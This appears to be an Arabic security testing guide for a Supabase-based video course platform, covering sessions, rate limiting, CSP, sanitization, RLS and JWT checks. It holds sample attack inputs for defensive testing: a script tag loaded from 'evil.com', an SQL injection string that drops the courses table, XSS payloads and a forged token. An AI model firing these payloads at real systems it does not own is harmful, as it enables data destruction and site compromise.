# 🔒 دليل اختبار الأمان الشامل

## نظرة عامة على ميزات الأمان المطبقة

### 1. أمان الجلسات (Session Security)
- ✅ جلسة واحدة لكل جهاز
- ✅ بصمة الجهاز (Device Fingerprinting)
- ✅ إبطال الجلسات عند تسجيل الدخول من جهاز آخر
- ✅ التحقق من صحة الجلسة

### 2. أمان المصادقة (Authentication Security)
- ✅ Rate Limiting على جانب العميل
- ✅ تشفير كلمات المرور (Supabase)
- ✅ JWT Tokens
- ✅ تجديد الرموز التلقائي

### 3. أمان الفيديو (Video Security)
- ✅ التحقق من التسجيل قبل مشاهدة الفيديو
- ✅ روابط مؤقتة (Tokenized URLs)
- ✅ تسجيل أحداث مشاهدة الفيديو
- ✅ علامة مائية (Watermark) للمستخدم

### 4. أمان البيانات (Data Security)
- ✅ Row Level Security (RLS) على كل الجداول
- ✅ Content Security Policy (CSP)
- ✅ تصفية المدخلات (Input Sanitization)
- ✅ التحقق من صحة الملفات

---

## 📋 اختبارات الأمان

### اختبار 1: جلسة واحدة لكل جهاز

**الهدف:** التأكد من أن المستخدم يمكنه تسجيل الدخول من جهاز واحد فقط.

**الخطوات:**
1. افتح المتصفح (Chrome) وسجل الدخول بحسابك
2. افتح متصفح آخر (Firefox أو Edge) وسجل الدخول بنفس الحساب
3. ارجع إلى المتصفح الأول

**النتيجة المتوقعة:**
- في المتصفح الأول، يجب أن تظهر رسالة "تم تسجيل خروجك لأن حسابك تم الوصول إليه من جهاز آخر"
- المتصفح الثاني يعمل بشكل طبيعي

**كيفية الاختبار اليدوي:**
```javascript
// في وحدة التحكم (Console) - المتصفح الأول
localStorage.getItem('device_id')
// سيظهر معرف الجهاز

// في المتصفح الثاني
localStorage.getItem('device_id')
// يجب أن يكون معرف مختلف
```

---

### اختبار 2: Rate Limiting

**الهدف:** التأكد من حماية تسجيل الدخول من هجمات القوة الغاشمة.

**الخطوات:**
1. اذهب إلى صفحة تسجيل الدخول
2. أدخل بريد إلكتروني صحيح وكلمة مرور خاطئة
3. كرر المحاولة 6 مرات

**النتيجة المتوقعة:**
- بعد 5 محاولات فاشلة، يجب أن تظهر رسالة "تم تجاوز عدد المحاولات المسموح. يرجى المحاولة بعد X دقيقة"

**كيفية الاختبار في Console:**
```javascript
// اختبار Rate Limiter
import { RateLimiter } from './src/lib/security.js';

const limiter = new RateLimiter(5, 15 * 60 * 1000);

// محاولة 6 مرات
for (let i = 0; i < 6; i++) {
  const result = limiter.checkLimit('test@email.com');
  console.log(`Attempt ${i + 1}:`, result);
}

// يجب أن تعود المحاولة السادسة بـ allowed: false
```

**إعادة تعيين الاختبار:**
```javascript
localStorage.removeItem('rate_limit_test@email.com');
```

---

### اختبار 3: حماية الفيديو - التحقق من التسجيل

**الهدف:** التأكد من أن الفيديوهات محمية ولا يمكن الوصول إليها بدون تسجيل.

**الخطوات:**
1. افتح دورة مدفوعة بدون تسجيل الدخول
2. حاول مشاهدة الفيديو

**النتيجة المتوقعة:**
- يجب عدم ظهور الفيديو
- يجب ظهور رسالة "سجل في الدورة لمشاهدة هذا المحتوى"

**اختبار API مباشر:**
```bash
# محاولة الوصول للفيديو بدون توكن
curl -X POST https://YOUR_SUPABASE_URL/functions/v1/generate-video-url \
  -H "Content-Type: application/json" \
  -d '{"video_id": "test", "lesson_id": "test"}'

# النتيجة المتوقعة: {"error": "No authorization header"}
```

---

### اختبار 4: Content Security Policy (CSP)

**الهدف:** التأكد من أن CSP يحمي من XSS.

**الخطوات:**
1. افتح أي صفحة في الموقع
2. افتح Developer Tools > Console
3. حاول تنفيذ:

```javascript
// محاولة إنشاء سكريبت خارجي
const script = document.createElement('script');
script.src = 'https://evil.com/malicious.js';
document.body.appendChild(script);
```

**النتيجة المتوقعة:**
- يجب ظهور خطأ CSP في Console
- لن يتم تحميل السكريبت الخارجي

---

### اختبار 5: تصفية المدخلات (Input Sanitization)

**الهدف:** التأكد من أن المدخلات يتم تنظيفها.

**اختبار في Console:**
```javascript
import { sanitizeInput, sanitizeHTML } from './src/lib/security.js';

// اختبار XSS
console.log(sanitizeInput('<script>alert("xss")</script>'));
// النتيجة المتوقعة: scriptalert("xss")/script

console.log(sanitizeInput('onclick="evil()"'));
// النتيجة المتوقعة: (يتم إزالة event handler)

console.log(sanitizeHTML('<img src="x" onerror="alert(1)">'));
// النتيجة المتوقعة: يتم إزالة onerror
```

---

### اختبار 6: التحقق من صحة الملفات

**الهدف:** التأكد من أن الملفات الخبيثة يتم رفضها.

**الخطوات:**
1. حاول رفع ملف .exe كصورة
2. حاول رفع ملف أكبر من الحد المسموح

**اختبار في Console:**
```javascript
import { validateImageUpload, validateVideoUpload } from './src/lib/security.js';

// ملف وهمي بنوع خاطئ
const fakeFile = new File(['content'], 'virus.exe', { type: 'application/exe' });
console.log(validateImageUpload(fakeFile));
// النتيجة: { valid: false, error: 'نوع الملف غير مدعوم' }

// ملف كبير جداً
const bigFile = { size: 100 * 1024 * 1024, type: 'image/jpeg', name: 'big.jpg' };
console.log(validateImageUpload(bigFile));
// النتيجة: { valid: false, error: 'حجم الملف كبير جداً' }
```

---

### اختبار 7: Row Level Security (RLS)

**الهدف:** التأكد من أن المستخدمين لا يمكنهم الوصول لبيانات غيرهم.

**اختبار في Supabase SQL Editor:**
```sql
-- اختبار: هل يمكن للمستخدم رؤية enrollments غيره؟
-- (يجب تنفيذه كـ authenticated user)

-- كمستخدم عادي، حاول الوصول لكل الـ enrollments
SELECT * FROM enrollments;
-- يجب أن يعود فقط enrollments هذا المستخدم

-- اختبار: هل يمكن للمستخدم تعديل دورة غيره؟
UPDATE courses SET title = 'Hacked' WHERE id = 'other-course-id';
-- يجب أن يفشل بسبب RLS
```

---

### اختبار 8: JWT Token Security

**الهدف:** التأكد من أن JWT tokens محمية.

**الخطوات:**
1. سجل الدخول واحصل على التوكن من localStorage
2. حاول تعديل التوكن واستخدامه

**في Console:**
```javascript
// الحصول على التوكن الحالي
const session = await supabase.auth.getSession();
console.log(session.data.session?.access_token);

// محاولة استخدام توكن معدل
const fakeToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmYWtlIjoidG9rZW4ifQ.fake';
const { data, error } = await supabase.auth.getUser(fakeToken);
console.log(error); // يجب أن يعود خطأ
```

---

### اختبار 9: Device Fingerprinting

**الهدف:** التأكد من أن بصمة الجهاز فريدة ومستقرة.

**في Console:**
```javascript
import { generateDeviceId, getDeviceInfo } from './src/lib/deviceFingerprint.js';

// توليد معرف الجهاز
const deviceId1 = generateDeviceId();
console.log('Device ID:', deviceId1);

// يجب أن يكون نفس المعرف عند الإعادة
const deviceId2 = generateDeviceId();
console.log('Same?', deviceId1 === deviceId2); // true

// معلومات الجهاز
console.log(getDeviceInfo());
```

---

### اختبار 10: Video Token Expiration

**الهدف:** التأكد من أن روابط الفيديو تنتهي صلاحيتها.

**في Console:**
```javascript
// استخدام Edge Function لتوليد رابط
const response = await fetch('/functions/v1/generate-video-url', {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${session.data.session?.access_token}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    video_id: 'video-id-here',
    lesson_id: 'lesson-id-here',
    device_id: deviceId
  })
});

const data = await response.json();
console.log('Expires at:', data.expires_at);
// يجب أن تكون الصلاحية ساعة واحدة من الآن
```

---

## 🛡️ اختبارات متقدمة

### اختبار SQL Injection

```javascript
// محاولة SQL Injection في البحث
const maliciousInput = "'; DROP TABLE courses; --";
const { data, error } = await supabase
  .from('courses')
  .select('*')
  .ilike('title', `%${maliciousInput}%`);

// Supabase يستخدم prepared statements، لذا هذا آمن
console.log(error); // لا يوجد خطأ SQL injection
```

### اختبار XSS في المحتوى

```javascript
// إنشاء دورة بمحتوى خبيث
const maliciousTitle = '<script>alert("xss")</script>';
const { data, error } = await supabase
  .from('courses')
  .insert({
    title: maliciousTitle,
    // ...
  });

// عند العرض، يجب أن يكون النص مُهرب (escaped)
```

---

## 📊 تقرير الأمان

### ميزات مطبقة ✅
| الميزة | الحالة | الاختبار |
|--------|--------|----------|
| Single Device Session | ✅ مطبق | اختبار 1 |
| Rate Limiting (Client) | ✅ مطبق | اختبار 2 |
| Video Access Control | ✅ مطبق | اختبار 3 |
| CSP Headers | ✅ مطبق | اختبار 4 |
| Input Sanitization | ✅ مطبق | اختبار 5 |
| File Validation | ✅ مطبق | اختبار 6 |
| RLS Policies | ✅ مطبق | اختبار 7 |
| JWT Authentication | ✅ مطبق | اختبار 8 |
| Device Fingerprint | ✅ مطبق | اختبار 9 |
| Token Expiration | ✅ مطبق | اختبار 10 |

### ميزات يجب إضافتها ⚠️
| الميزة | الأولوية | الوصف |
|--------|----------|-------|
| Server-side Rate Limiting | عالية | حماية من هجمات DDoS |
| Signed Video URLs | عالية | حماية إضافية للفيديو |
| Video Watermark | متوسطة | علامة مائية مرئية |
| Screen Capture Detection | متوسطة | منع تسجيل الشاشة |
| Audit Logging | متوسطة | سجل الأحداث الأمنية |

---

## 🔐 إعدادات Bunny Stream للأمان

### 1. تفعيل Token Authentication

1. اذهب إلى Bunny Stream Dashboard
2. اختر مكتبتك > Security
3. فعّل "CDN Token Authentication"
4. احفظ Token Authentication Key

### 2. تقييد النطاقات

1. في Security > Allowed Domains
2. أضف نطاقك فقط: `yourdomain.com, *.yourdomain.com`

### 3. تعطيل Direct Play (اختياري)

1. في Security > Enable direct play
2. أوقفه إذا كنت تريد حماية أقوى


